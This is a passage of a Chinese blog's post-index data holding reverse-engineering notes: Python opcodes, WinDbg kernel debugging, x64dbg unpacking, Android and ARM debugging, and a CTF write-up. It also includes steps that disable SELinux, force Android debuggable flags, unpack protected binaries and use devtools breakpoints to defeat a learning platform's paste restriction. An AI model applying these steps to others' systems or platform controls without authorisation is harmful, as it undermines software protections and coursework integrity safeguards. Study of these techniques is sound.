3，则表示构建一个扩展的切片（包含 start、stop 和 step，如 a[start:stop:step]）。\n\n\n栈操作：\n\n从栈顶弹出 step（如果有）、stop 和 start 的值。\n将这些值组合成一个切片对象，并将切片对象推入栈顶。\n\n\n\n函数操作创建MAKE_FUNCTION(flags):\n\n作用：创建一个函数对象。flags用于指示函数的特性（如默认参数、闭包等）。\n\n调用\nCALL_FUNCTION(argc):\n作用：调用一个函数，argc指定位置参数的数量。函数和参数从栈顶弹出，返回值推入栈顶。\n示例：用于普通函数调用，如func(arg1, arg2)。\n\n\nCALL_FUNCTION_KW(argc):\n作用：调用一个函数，argc指定位置参数的数量，关键字参数以字典形式传递。函数、参数和关键字字典从栈顶弹出，返回值推入栈顶。\n示例：用于带关键字参数的函数调用，如func(arg1, arg2, key=value)。\n\n\nCALL_FUNCTION_EX(flags):\n作用：调用一个函数，支持扩展的参数传递方式。flags用于指示是否传递关键字参数。\n示例：用于动态参数传递，如func(*args, **kwargs)。\n\n\nCALL_METHOD(argc):\n作用：调用一个方法，argc指定位置参数的数量。对象、方法和参数从栈顶弹出，返回值推入栈顶。\n示例：用于对象方法的调用，如obj.method(arg1, arg2)。\n\n\n\n返回\nRETURN_VALUE:\n作用：将栈顶的值作为函数的返回值，并结束函数的执行。\n示例：用于return语句。\n\n\n\n加载与存储1. 局部变量操作码这些操作码用于访问和修改函数的局部变量。\n\nLOAD_FAST(var_num):\n作用：从局部变量表中加载第var_num个变量到栈顶。\n示例：用于访问函数的局部变量。\n\n\nSTORE_FAST(var_num):\n作用：将栈顶的值存储到局部变量表中的第var_num个变量。\n示例：用于赋值给函数的局部变量。\n\n\n\n\n2. 全局变量操作码这些操作码用于访问和修改全局变量。\n\nLOAD_GLOBAL(namei):\n作用：从全局变量表中加载第namei个变量到栈顶。\n示例：用于访问全局变量或内置函数。\n\n\nSTORE_GLOBAL(namei):\n作用：将栈顶的值存储到全局变量表中的第namei个变量。\n示例：用于赋值给全局变量。\n\n\n\n\n3. 名称操作码这些操作码用于访问和修改当前命名空间中的变量。\n\nLOAD_NAME(namei):\n作用：从名称表中加载第namei个名称到栈顶。\n示例：用于访问变量或函数名。\n\n\nSTORE_NAME(namei):\n作用：将栈顶的值存储到名称表中的第namei个名称。\n示例：用于赋值给变量。\n\n\n\n\n4. 闭包和自由变量操作码这些操作码用于访问和修改闭包中的变量。\n\nLOAD_CLOSURE(i):\n作用：加载闭包变量。i是闭包变量的索引。\n示例：用于闭包函数的定义。\n\n\nLOAD_DEREF(i):\n作用：加载闭包变量或自由变量。i是变量的索引。\n示例：用于访问闭包中的变量。\n\n\nSTORE_DEREF(i):\n作用：将栈顶的值存储到闭包变量或自由变量中。i是变量的索引。\n示例：用于修改闭包中的变量。\n\n\n\n\n5. 属性操作码这些操作码用于访问和修改对象的属性。\n\nLOAD_ATTR(namei):\n作用：加载对象的属性。对象和属性名从栈顶弹出，属性值推入栈顶。\n示例：用于访问对象属性，如obj.attr。\n\n\nSTORE_ATTR(namei):\n作用：将栈顶的值存储到对象的属性中。对象和属性名从栈顶弹出。\n示例：用于赋值给对象属性，如obj.attr = value。\n\n\n\n\n6. 常量操作码这些操作码用于加载常量。\n\nLOAD_CONST(consti):\n作用：将常量表中的第consti个常量加载到栈顶。\n示例：用于加载数字、字符串等常量。\n\n\n\n\n7. 其他加载操作码这些操作码用于加载其他类型的数据。\n\nLOAD_BUILD_CLASS:\n作用：加载__build_class__函数到栈顶，用于类的构建。\n示例：用于class语句。\n\n\nLOAD_METHOD(namei):\n作用：加载对象的方法。对象和方法名从栈顶弹出，方法推入栈顶。\n示例：用于调用对象方法，如obj.method()。\n\n\n\n堆栈操作\n1. 基本堆栈操作码这些操作码用于直接操作栈顶的数据。\n\nPOP_TOP:\n作用：弹出栈顶的元素。\n示例：用于清理栈顶的临时值。\n\n\nDUP_TOP:\n作用：复制栈顶的元素，并将副本推入栈顶。\n示例：用于需要重复使用栈顶值的场景。\n\n\nDUP_TOP_TWO:\n作用：复制栈顶的两个元素，并将副本按顺序推入栈顶。\n示例：用于需要重复使用栈顶两个值的场景。\n\n\nROT_TWO:\n作用：交换栈顶的两个元素。\n示例：用于交换两个变量的值。\n\n\nROT_THREE:\n作用：将栈顶的三个元素旋转，使得第三个元素成为栈顶。\n示例：用于复杂的值交换。\n\n\nROT_FOUR:\n作用：将栈顶的四个元素旋转，使得第四个元素成为栈顶。\n示例：用于更复杂的值交换。\n\n\nNOP:\n作用：空操作，不执行任何操作。\n示例：用于占位或调试。\n\n\nPRINT_EXPR:\n作用：弹出栈顶的值并打印。\n示例：用于交互式环境中的表达式求值。\n\n\n\n","categories":["工具"],"tags":["re,工具"]},{"title":"windows内核调试","url":"/2025/03/28/win%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F%E9%80%86%E5%90%91%E4%BB%A5%E5%8F%8A%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/","content":"先搭建内核开发环境windbg驱动调试的环境搭建。推荐阅读微软官方文档开始使用 WinDbg（内核模式） - Windows drivers | Microsoft Learn\nwindows系统内核调试 环境搭建（保姆级）_dsigntool-CSDN博客\n下载 Windows 驱动程序工具包 (WDK) - Windows drivers | Microsoft Learn\nWindows驱动程序逆向工程方法 - 🔰雨苁ℒ🔰\n驱动开发：WinDBG 配置内核双机调试 - lyshark - 博客园\n备忘录\n反调试：\n内核下的调试与反调试 - iBinary - 博客园\n总结\n一些要用到的命令。\n推荐串行接口进行调试\n\\\\.\\pipe\\com_2\n\n符号表环境变量\n_NT_SYMBOL_PATH         SRV*D:\\Myself_Software\\Windows_soft\\symbols*http://msdl.microsoft.com/download/symbols\n\nwindbg内核调试操作\n开启调试服务（需要关闭安全引导）\nbcdedit /debug onbcdedit /dbgsettings serial debugport:1 baudrate:115200\n\nwindbg attach kernel后重启即可\n.reload #加载内核符号\n\n\n\nwindbg常用快捷键F5 继续\nF10 逐过程\nF11 逐语句\nShift+F11 单步跳出\nF7 运行到行\t\nCtrl + F9 在突出显示的行上切换启用断点状态\nShift + F9  添加断点\nCtrl+Shift+O 打开脚本\nCtrl+Shift+Enter 执行脚本\nCtrl+S 保存脚本\nAlt+S、N 新脚本\n控制台常用命令其实控制台可以用鼠标点击选项进行操作。\n.hh 命令访问参考命令帮助g 运行pa [addr] 执行到.symfix 设置符号表或添加本地符号(.symfix+ path).reload 加载符号表 (/f添加路径)lm 列出所有模块lm m name v 特性模块信息x [Options] Module!Symbol 检查符号x /D model!name 查找符号可用通配符*sxe ld [name]\t拦截模块的加载e&#123;b|d|q|a|f|D|a&#125; Address [Values] 写入值到内存中d&#123;a|b|c|d|D|f|p|q|u|w|W&#125; [addr]  打印内存中的值bl 查看断点bp\t设置一个将一直处于活动状态的断点，直到其所在模块被卸载。bp /w &quot;@esp &lt; 0x6ff9f8&quot; [addr] \t条件断点bu\t设置一个断点，该断点在卸载模块时未解析，并在重新加载模块时重新启用。bm\t为符号设置一个断点。 此命令适当地使用 bu 或 bp，并允许使用通配符（*）对匹配的每个符号（如类中的所有方法）设置断点。bc\t清除列表中的断点。 使用 bc * 清除所有断点。bd\t禁用断点。 使用 bd * 禁用所有断点。be\t启用断点。 使用 be * 启用所有断点。ba &lt;access&gt; &lt;size&gt; &lt;address&gt; &#123;options&#125; 设置在访问内存位置时触发的断点（e\t执行：当 CPU 从地址中提取指令时。r\t读/写：当 CPU 读取或写入地址时。w\twrite：当 CPU 写入地址时）.bpcmds (显示断点命令)dv 命令来显示给定帧的所有局部变量的名称和值kp\t显示堆栈和参数的完整列表。kn\t允许您查看堆栈以及旁边的帧信息。！process 调试器扩展来显示或设置进程信息dv dename!name 查与例程关联的区域设置变量!process 0 0 显示所有进程的摘要信息。（0 27）输出全部！thread 命令查看线程.thread 设置当前线程r 查看寄存器!lmi 扩展显示有关模块的详细信息!dh 扩展显示标头信息lsf- [filename] 添加源码.lsrcpath+ 设置本地源路径.load [dllpath] 加载dll (加载位置待验证).chain 查看已加载的dll 脚本：.scriptproviders（列出脚本提供程序）.scriptload [jspath]（加载脚本）.scriptload（卸载脚本）.scriptrun [jspath]（运行脚本）.scriptlist（列出已加载的脚本）\n\nwindbg脚本(摘自官方文档JavaScript 调试器脚本 - Windows drivers | Microsoft Learn)\n用vscod编写时把C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\winext\\JsProvider.d.ts放到当前目录，并在脚本文件前添加\n/// &lt;reference path=&quot;JsProvider.d.ts&quot; /&gt;\n\njs脚本可调用api调试器数据模型 - 代码命名空间 - Windows drivers | Microsoft Learn\n一个框架，来自官方。\n// Root of Scripthost.diagnostics.debugLog(&quot;***&gt;; Code at the very top (root) of the script is always run \\n&quot;);function initializeScript() //加载脚本时执行&#123;    // Add code here that you want to run every time the script is loaded.     // We will just send a message to indicate that function was called.    host.diagnostics.debugLog(&quot;***&gt;; initializeScript was called \\n&quot;);&#125;function invokeScript() //执行脚本时执行&#123;    // Add code here that you want to run every time the script is executed.     // We will just send a message to indicate that function was called.    host.diagnostics.debugLog(&quot;***&gt;; invokeScript was called \\n&quot;);&#125;function uninitializeScript() //卸载脚本时执行（主函数）&#123;    // Add code here that you want to run every time the script is unloaded.     // We will just send a message to indicate that function was called.    host.diagnostics.debugLog(&quot;***&gt;; uninitialize was called\\n&quot;);&#125;function main() //只是一个函数而已没别的作用&#123;    // main is just another function name in JavaScript    // main is not called by .scriptload or .scriptrun      host.diagnostics.debugLog(&quot;***&gt;; main was called \\n&quot;);&#125;\n\n条件断点\n/// &lt;reference path=&quot;JsProvider.d.ts&quot; /&gt;// Use JavaScript strict mode &quot;use strict&quot;;// Define the invokeScript method to handle breakpoints function invokeScript() &#123;    var ctl = host.namespace.Debugger.Utility.Control;    //Get the address of my string    var address = host.evaluateExpression(&quot;pszCaption&quot;);    // The open and save dialogs use the same function    // When we hit the open dialog, continue.    // When we hit the save dialog, break.    if (host.memory.readWideString(address) == &quot;Open&quot;) &#123;        // host.diagnostics.debugLog(&quot;We&#x27;re opening, let&#x27;s continue!\\n&quot;);        ctl.ExecuteCommand(&quot;gc&quot;);    &#125;    else    &#123;        //host.diagnostics.debugLog(&quot;We&#x27;re saving, let&#x27;s break!\\n&quot;);    &#125;  &#125;\n\nwindbg的脚本开发还是挺困难的，教程也比较少微软自己提供了一个项目用于学习microsoft&#x2F;WinDbg-Samples: Sample extensions, scripts, and API uses for WinDbg.\n另外一个使用脚本hugsy&#x2F;windbg_js_scripts: Toy scripts for playing with WinDbg JS API\n进阶使用windbgtips (@windbgtips) &#x2F; X\n时间旅行调试TTD\n[InsightEngineering&#x2F;Time Travel Debugging (TTD) at main · DebugPrivilege&#x2F;InsightEngineering](https://github.com/DebugPrivilege/InsightEngineering/tree/main/Time Travel Debugging (TTD))\n时间旅行调试 - 概述 - Windows drivers | Microsoft Learn\n[原创]TTD调试与ttd-bindings逆向工程实践-软件逆向-看雪-安全社区|安全招聘|kanxue.com\n驱动开发环境配置微软的教程非常的好用，下面我只提出几点需要记住的比较重要的事项。\n编写 Hello World Windows 驱动程序（内核模式） - Windows drivers | Microsoft Learn\n我这里使用的是windows11 + vs2022的主机和用于调试的windows 10的虚拟机。开发框架采用KWDF。\nKWDF是以调用回调函数的来执行操作的，每一个函数都对应一个事件，通过事件的触发来调用回调函数进行数据处理。由于封装的方法较多，开发比较简单。\n根据微软的教程，配置好环境，我们在编写完后可以用vs直接把驱动部署在虚拟机上，其中的驱动文件位置在\n%systemdrive%\\drivertest\\drivers\n\n把devcon.exe放到虚拟机的驱动位置下，通过命令来进行驱动程序的安装。（需要管理员权限）\ndevcon install XXX.inf root\\XXX\n\nroot\\后面的内容可以在inf文件中找到（驱动程序路径）\n[Standard.NT$ARCH$]%KmdfHelloWorld.DeviceDesc%=KmdfHelloWorld_Device, Root\\KmdfHelloWorld\n\n源码调试时用，把pdb文件所在位置设置为本地源路径，.reload后会自动加载源码的符号。\n.lsrcpath+ 设置本地源路径\n\n在windbg的左上角点击文件，选择source file添加源代码（直接显示源代码窗口），或者用lsf- [filename] 添加源码（无窗口）。根据微软文档的解释，如果使用 WinDbg，只要程序计数器位于调试器具有其源信息的代码中，就会立即显示“源”窗口。即用源代码进行调试。在源模式下调试 - Windows drivers | Microsoft Learn\n跟随官方文档，我们的环境差不多安装完成，接下来正式进行代码编写。\n驱动安装一般驱动工具安装：Downloads:Driver Loader\n自注册服务：\nsc create [name] type= kernel start= demand binPath= [path.sys]sc start [name]sc stop [name]sc delete [name]\n\ninf文件：\n这里令驱动名字为Driver1，文件为Driver1.sys和Driver1.inf(由vs生成)\ndevcon安装\ndevcon.exe install XXX.inf root\\[name]\n\n右键文件安装也可行。\n;; Driver1.inf;[Version]Signature   = &quot;$WINDOWS NT$&quot;Class       = System ; TODO: specify appropriate ClassClassGuid   = &#123;4d36e97d-e325-11ce-bfc1-08002be10318&#125; ; TODO: specify appropriate ClassGuidProvider    = %ManufacturerName%CatalogFile = Driver1.catDriverVer   = ; TODO: set DriverVer in stampinf property pagesPnpLockdown = 1[DestinationDirs]DefaultDestDir = 13[SourceDisksNames]1 = %DiskName%,,,&quot;&quot;[SourceDisksFiles]Driver1.sys = 1,,;*****************************************; Install Section;*****************************************[Manufacturer]%ManufacturerName% = Standard,NT$ARCH$.10.0...16299 ; %13% support introduced in build 16299[Standard.NT$ARCH$.10.0...16299]%Driver1.DeviceDesc% = Driver1_Device, Root\\Driver1 ; TODO: edit hw-id[Driver1_Device.NT]CopyFiles = File_Copy[File_Copy]Driver1.sys;-------------- Service installation[Driver1_Device.NT.Services]AddService = Driver1,%SPSVCINST_ASSOCSERVICE%, Driver1_Service_Inst; -------------- Driver1 driver install sections[Driver1_Service_Inst]DisplayName    = %Driver1.SVCDESC%ServiceType    = 1               ; SERVICE_KERNEL_DRIVERStartType      = 3               ; SERVICE_DEMAND_STARTErrorControl   = 1               ; SERVICE_ERROR_NORMALServiceBinary  = %13%\\Driver1.sys[Driver1_Device.NT.Wdf]KmdfService = Driver1, Driver1_wdfsect[Driver1_wdfsect]KmdfLibraryVersion = $KMDFVERSION$[Strings]SPSVCINST_ASSOCSERVICE = 0x00000002ManufacturerName = &quot;huanghunr&quot; ;TODO: Replace with your manufacturer nameDiskName = &quot;Driver1 Installation Disk&quot;Driver1.DeviceDesc = &quot;Driver1 Device&quot;Driver1.SVCDESC = &quot;Driver1 Service&quot;\n\n\n\nCTF中的驱动开发结构分析与学习下面通过一个以diviceiocontrol进行通信的程序为例子分析一个驱动程序的一些主要要素。\nDeviceiocontrol：应用程序与驱动程序通信 DeviceIoControl - 沉疴 - 博客园\n#include &lt;ntddk.h&gt;#include &lt;wdf.h&gt;#include &lt;initguid.h&gt;// 自定义 IOCTL 控制码,用于deviceiocontrol通信执行操作 参数(irp生成函数，设备对象类型，ioct控制码(0x800--0xfff)，// 访问权限)#define Driver_IOCT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)// 回调函数声明DRIVER_INITIALIZE DriverEntry; //声明入口EVT_WDF_DRIVER_DEVICE_ADD HelloKMDFEvtDeviceAdd; //声明在设备连接时调用的函数EVT_WDF_IO_QUEUE_IO_DEVICE_CONTROL HelloKMDFEvtIoDeviceControl; //deviceiocontrol消息处理函数// 驱动入口 参数(驱动对象，注册表路径)NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) &#123;    WDF_DRIVER_CONFIG config; //WDF_DRIVER_CONFIG结构体，保存了驱动的一些信息    WDF_DRIVER_CONFIG_INIT(&amp;config, HelloKMDFEvtDeviceAdd); //初始化回调函数(把回调函数注册到驱动的信息中)    KdPrint((&quot;HelloKMDF: DriverEntry\\n&quot;)); //输出信息\t//KMDF创建并注册驱动对象，这代表我们已经完成所有回调函数的部署，KMDF框架自动帮我们注册驱动。    return WdfDriverCreate(DriverObject, RegistryPath, WDF_NO_OBJECT_ATTRIBUTES, &amp;config, WDF_NO_HANDLE);&#125;// 设备添加时回调(由WDF_DRIVER_CONFIG_INIT()注册)NTSTATUS HelloKMDFEvtDeviceAdd(WDFDRIVER Driver, PWDFDEVICE_INIT DeviceInit) &#123;    UNREFERENCED_PARAMETER(Driver);    WDFDEVICE device;    NTSTATUS status;    // 设置设备名字    DECLARE_CONST_UNICODE_STRING(devName, L&quot;\\\\Device\\\\HelloKMDF&quot;);    WdfDeviceInitAssignName(DeviceInit, &amp;devName);    // 创建设备    status = WdfDeviceCreate(&amp;DeviceInit, WDF_NO_OBJECT_ATTRIBUTES, &amp;device);    if (!NT_SUCCESS(status)) return status;    // 创建默认队列处理 DeviceIoControl    WDF_IO_QUEUE_CONFIG ioQueueConfig;    WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE(&amp;ioQueueConfig, WdfIoQueueDispatchSequential);    ioQueueConfig.EvtIoDeviceControl = HelloKMDFEvtIoDeviceControl;    return WdfIoQueueCreate(device, &amp;ioQueueConfig, WDF_NO_OBJECT_ATTRIBUTES, WDF_NO_HANDLE);&#125;// 处理用户态 IOCTL 请求VOID HelloKMDFEvtIoDeviceControl(WDFQUEUE Queue, WDFREQUEST Request,                                 size_t OutputBufferLength, size_t InputBufferLength,                                 ULONG IoControlCode) &#123;    UNREFERENCED_PARAMETER(Queue);    UNREFERENCED_PARAMETER(OutputBufferLength);    UNREFERENCED_PARAMETER(InputBufferLength);    if (IoControlCode == IOCTL_HELLOKMDF) &#123;        KdPrint((&quot;HelloKMDF: 收到 IOCTL_HELLOKMDF 指令！\\n&quot;));    &#125;    WdfRequestComplete(Request, STATUS_SUCCESS);&#125;\n\n之后再去了解一下其他通信，总结点模板。\n","categories":["Re学习"],"tags":["re,学习"]},{"title":"x64dbg手工脱壳学习","url":"/2025/01/07/xdbg%E6%89%8B%E5%B7%A5%E8%84%B1%E5%A3%B3%E5%AD%A6%E4%B9%A0/","content":"对一个程序壳的理解一个程序被加壳，在我的理解下就是一个程序的代码被加密，从而使ida等反编译工具不能识别为代码数据，然后再在程序前嵌入一块代码，在程序运行时会先进行解密然后再运行。既然如此，我们就可以在运行时解密完程序就把程序提取出来。\n下面的程序中，这是我们一开始的点，程序从这里开始。对于一个加了壳的程序而言，它必须先运行解密代码，这段解密代码一般会被xdbg识别为Enterpoint（主入口），而一个函数的执行必须先压入栈，结束时又要弹出栈，且先入栈的最后弹出，那么在第一个被压入的栈被弹出时，也就意味着一个函数的结束，我们可以在第一个入栈时的栈顶RSP下断点，那么在出栈时就会断在函数结束的位置，从而走完解密程序我们只要把解密后的程序dump下来就行了。那么思路就清晰了，步骤就是\n\n\n寻找解密开始点\n在push上下硬件断点\n运行到pop的位置（解密结束的位置）\n找jmp到主程序的点\n在jmp处断点，用scylla进行dump\n\n\n具体步骤找到程序的入口，运行一步push，在RSP处下硬件断点\n\n运行后停在这个位置，上面有一堆pop，我们执行到下面jmp的位置，然后用scylla，dump程序\n\ndump程序，要获取一下ITA，然后转储。\n\n脱壳成功\n\n","categories":["学习"],"tags":["re,学习"]},{"title":"调试学习","url":"/2024/11/28/%E5%85%B3%E4%BA%8E%E9%9D%9EPE%E6%96%87%E4%BB%B6%E7%9A%84%E8%B0%83%E8%AF%95/","content":"arm文件\n安装qemu-arm虚拟机以及依赖\n\napt install re2capt install ninja-buildapt install build-essential zlib1g-dev pkg-config libglib2.0-devapt install binutils-dev libboost-all-dev autoconf libtool libssl-dev libpixman-1-dev libpython-dev python-pip python-capstone virtualenvapt install libpixman-1-devapt install bison flexapt install mesonapt install libpixman-1-devapt-get install libpcap-dev libnids-dev libnet1-devapt-get install libattr1-devapt-get install libcap-ng-dev\n\nqemu-arm –version #用于检查安装是否成功\n\nqemu-arm -g 23946 文件\n启动程序。23946是ida默认端口，也可以自己换。\n\nifconfig #查看ip地址\n\n在ida上选择remote GDB debugger调试输入地址就行即可。\n\napk文件用jeb进行调试，需要app或模拟器开启debug调试adb启用应用调试\nadb shell am start -D -n 包名/类名\n\n例如: adb shell am start -D -n com.zhuotong.easyctf2&#x2F;.MainActivity\n\n记得加点在mainactivity前\n下断点快捷键：ctrl+B，只能在汇编页面下断点然后在jeb里面连接，在右侧就可以看到变量的值\n\n注意，有些值可能不在这个外层方法使用，这个时候我们要先单步进入到方法里面才可以拿到值\n\n\n安卓so文件先把ida的调试文件用adb push到机器里面，然后赋予执行权限，启动合适的服务。\nadb rootadp push filelocation /data/local/tmpadb shell susetenforce 0             #关闭进程保护cd /data/local/tmpchmod 777 *./flienameadb forward tcp:23946 tcp:23946  #新开一个命令行设置端口转发adb shell dumpsys activity top  #获取前端的包名\n接下来打开安卓sdk中自带的ddms,输入下面命令启动程序\nadb shell am start -D -n 包名/.类名  #启动应用调试示例: adb shell am start -D -n com.test.app/.MainActivity\n在ddms中记住调试进程的端口。现在来到ida中配置，选择debugger，process options，在hostname中填入127.0.0.1，port默认23946，然后再到debugger中选择attath to process，选择要调试的安卓进程。记得打上一个断点，进入后会卡住，这时候我们输入,其中port后面的数字就是我们记住的端口。\njdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700\n\n如果ddms里面不显示进程可以尝试打开全局调试，下面是在magsk下的方案\n在adb shell su下输入以下命令\nmagisk resetprop ro.secure 0magisk resetprop ro.debuggable 1getprop ro.debuggable #若结果为1则成功开启\n\n重启手机。\nIOT根据架构qemu运行，命令后面加上 -s -S\ngdb远程调试附加（默认端口1234）\ntarget remote 127.0.0.1:1234\n\n直接用ida的远程gdb调试也行。\n","categories":["Re学习"],"tags":["re,学习"]},{"title":"学习通粘贴的解决办法之一","url":"/2024/11/08/%E5%85%B3%E4%BA%8E%E5%AD%A6%E4%B9%A0%E9%80%9A%E8%A7%A3%E9%99%A4%E5%8F%AA%E8%83%BD%E5%A4%8D%E5%88%B6/","content":"有手就行\n打开网页版学习通进入要解除限制的页面\n按F12或者在浏览器右上角找到开发人员工具打开1,进到源代码页面，按CTRL+F，搜索”if (parseInt(allowPaste) &#x3D;&#x3D; 1)”,然后点击左侧②处箭头所指的位置下一个断点。后面点击④处寻找下一处有”if (parseInt(allowPaste) &#x3D;&#x3D; 1)”的地方，重复②④步骤直到把找到的全部位置打上断点。然后刷新网页⑤，然后去控制台输入“ allowPaste &#x3D; “0”; ”,回车后若显示’0’,则成功，然后点击一次⑧运行。重复⑥⑦⑧步，直到页面正常显示就可以了。\n\n","categories":["工具"],"tags":["生活,工具"]},{"title":"2024长城杯初赛Re部分复现","url":"/2024/12/25/%E5%9B%BD%E8%B5%9B2024/","content":"dump原程序是一个命令行工具，需要用命令行参数来进行使用，使用方法是在命令行输入以下命令\nre.exe [data]\n\n我们输入的数据会被加密，我们尝试输入几个字符就可以发现每个字符加密的对应结果是相同的，也就是单字节加密，那么我们就可以输入所有可打印字符得到加密后的结果，再把结果和原字符的数据映射起来就可以依据密文得出明文。\n在这里密文被以二进制的形式保存都在flag文件中，我们需要用读文件的方式把密文读入。\n脚本如下\n在这个脚本中我尝试直接获得可打印字符，但是最后对比了其他人的wp，发现引号是不会被re.exe输出的，也就是如果你把引号也输入进去获取映射表，那么你的获得的映射表就会少一位，导致映射错误。在最后我们会发现还缺少了一个字符，但是base64编码的样子已经出来了，我们手动添加一个字符解码看看规律。\n\n解码后我们会发现很多奇怪的数字，感觉上像是一个时间戳，于是我们过滤掉那些含有符号的结果，最终找到上面的结果，把每个都输入一下就可以发现flag就是(原题中告诉了我们第十三位为4，我们假设不知道，分析数据解决)\nflag{MTczMDc4MzQ2Ng&#x3D;&#x3D;}\nimport base64from base64 import b64decodefrom idlelib.iomenu import encodingfrom logging import exceptionimport timefrom cli_helpers.utils import bytes_to_stringfrom mpmath.calculus.calculus import defundef decrypt_cipher(enc_chars, text):    # 可打印字符    chars = &quot;!#$%&amp;&#x27;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~ &quot;    # chars = &quot;&quot;.join(chr(i) for i in range(32,127))  //直接获得可打印字符    # 对应的密文    mp = &#123;&#125;    for i, char in enumerate(chars):  #迭代器，返回索引和迭代元素        hex_char = enc_chars[2 * i:2 * i + 2]  # 每两个字符为一组        mp[bytes.fromhex(hex_char)] = char    print(mp)    # 解密过程    plaintext = &quot;&quot;    for b in text:        plaintext += mp.get(bytes([b]), &#x27;?&#x27;)  # 用get获取键的值，如果没有匹配，使用占位符    return plaintext# 从二进制文件读取密文def readf(filepath):    with open(filepath, &#x27;rb&#x27;) as file:        return file.read()# 文件路径path = r&quot;E:\\CTF\\国赛1\\dump_a3645b5eeb8783766cf2f413837dfc77\\bin\\flag&quot;# 读取密文text = readf(path)# 解密flag = decrypt_cipher(    &quot;0000000000000000000000000000001c1d000000000000000000000100000002030405060708090a0b0c0d0e0f101112131415161718191a1b0000000000001e1f202122232425262728292a2b2c2d2e2f30313233343536373800390000&quot;,    text)print(flag)for i in range(43,122):    bflag = bytes(flag.replace(&#x27; &#x27;, &#x27;&#x27;.join(chr(i))), encoding=&#x27;UTF-8&#x27;)[5:len(flag) -1:]  #手动插入字符    try:        decflag = bytes_to_string(base64.decodebytes(bflag))        if(decflag.isdigit()):            print(f&quot;flag为:flag&#123;&#123;&#123;bytes_to_string(bflag)&#125;&#125;&#125;,flag&#123;&#123;&#123;decflag&#125;&#125;&#125;&quot;)            timestamp = int(decflag)            time_local = time.localtime(timestamp)            dt = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time_local)            print(dt)    except:        continue\n\ncythonkey在python的test1pyc文件中，用pycdas人工或者AI读字节码，得到大概逻辑如下\nimport ezflag = input(&quot;flag&quot;)flag1 = list(flag)value = []b = 0ck = 0if(len(flag1) != 24):    return 0for i in range(0,len(flag1),4):    b = ord(flag1[i]) &lt;&lt; 24 or ord(flag1[i+1]) &lt;&lt; 16 or ord(flag1[i+2]) &lt;&lt; 8 or ord(flag1[i+3])    value.append(b)key =[102, 108, 97, 103]flag_encrypt = []for i in range(0,6,2):    res = ez.encrypt(value[i],value[i+1],key)    flag_encrypt.append(res)ck = ez.check(flag_encrypt)if ck == 3:    print(&quot;yes!!!,you get right flag&quot;)else:    print(&quot;wrong&quot;)\n\n分析pyd模块，创建一个python3.11的cython模块（有附件）用bindiff恢复符号。\n恢复结构体\ntypedef struct __strings &#123;    __int64* int_0;    __int64* int_1;    __int64* int_2;    __int64* int_3;    __int64* int_4;    __int64* int_5;    __int64* int_6;    __int64* str_xinxin;    __int64* str_v0;    __int64* str_v1;    __int64* str_wenhao;    __int64* str_asyncio;    __int64* str_c_uubt32;    __int64* str_check;    __int64* str___class_getitem;    __int64* str_cline_in_traceback;    __int64* str_ctypes;    __int64* str_data;    __int64* str_delta;    __int64* str_encrypt;    __int64* str_ez;    __int64* str_ez_py;    __int64* str_flag_encrypt;    __int64* str_i;    __int64* str__inport_;    __int64* str__is_continue;    __int64* str_key;    __int64* str_main;    __int64* str_name;    __int64* str_range;    __int64* str_test;    __int64* str_total;    __int64* str_unk;    __int64* str_v1;    __int64* str_value;    __int64* int_0a\t__int64* int_1a\t__int64* int_3a\t__int64* int_6a\t__int64* int_11a\t__int64* int_345309213a\t__int64* int_947843023a\t__int64* int_1415865428a\t__int64* int_1592923520a    __int64* int_2248247555s;    __int64* int_3785781401s;    __int64* int_3805970057s;    __int64* int_47;    __int64* int_48;    __int64* int_49;    __int64* int_50;    __int64* int_51;    __int64* int_52;    __int64* int_53;    __int64* int_54;    __int64* int_55;    __int64* int_56;    __int64* int_57;    __int64* int_58;    __int64* int_59;    __int64* int_60;    __int64* int_61;    __int64* int_62;    __int64* int_63;&#125; str;\n\n分析加密函数，函数名受到了恢复符号的影响，通过ez.encrypt这个字符串寻找就行，_Pyx_PyVectorcall_FastCallDict_kw函数是由__pyx_pymod_exec_ez函数调用的，把v0，v1，key通过参数传入_Pyx_PyVectorcall_FastCallDict_kw。\n__int64 __fastcall _Pyx_PyVectorcall_FastCallDict_kw(__int64 a1, __int64 v0, __int64 v1, __int64 a4)&#123;  _QWORD *v4; // rbp  _QWORD *v5; // rbx  __int64 v6; // rsi  _QWORD *AttrStrNoError; // r15  _QWORD *v111; // r13  __int64 *str_c_uint32; // rdi  __int64 *v12; // rdi  int v13; // ecx  _QWORD *v14; // rax  _QWORD *v15; // rcx  bool v16; // zf  _QWORD *v000; // rdi  unsigned int v18; // r12d  unsigned int v19; // r14d  __int64 *v20; // rbp  __int64 *v21; // rbp  int v22; // ecx  _QWORD *v23; // rax  _QWORD *v24; // rcx  __strings *data3; // r8  _QWORD *v1111; // r14  __int64 *int_1415865428a; // rsi  __int64 *v28; // rbx  __int64 *v29; // rbx  _QWORD *Item_KnownHash; // rax  _QWORD *v31; // rbx  unsigned int v32; // ecx  _QWORD *v33; // rax  _QWORD *v34; // rcx  _QWORD *v35; // rbp  __int64 *v36; // rbx  __int64 v37; // rdi  __int64 *str_value; // rdx  __int64 (__fastcall *v40)(_QWORD *, __int64 *); // r8  __int64 Attr; // rax  __int64 *v42; // rdx  __int64 (__fastcall *v43)(_QWORD *, __int64 *); // r8  unsigned __int64 v1_value; // rax  __int64 *v45; // rdx  __int64 (__fastcall *v46)(_QWORD *, __int64 *); // r8  __int64 v47; // rax  __int64 *v48; // rdx  __int64 (__fastcall *v49)(_QWORD *, __int64 *); // r8  __int64 v1_value2; // rax  __int64 *v51; // rdx  __int64 (__fastcall *v52)(__int64, __int64 *); // r8  __int64 sum_value; // rax  __int64 *v54; // rdx  __int64 (__fastcall *v55)(__int64, __int64 *); // r8  __int64 sum_value1; // rax  int v57; // ecx  __int64 sum_and_3; // rax  __int64 *v59; // rdx  __int64 (__fastcall *v60)(_QWORD *, __int64 *, _QWORD *); // r9  int 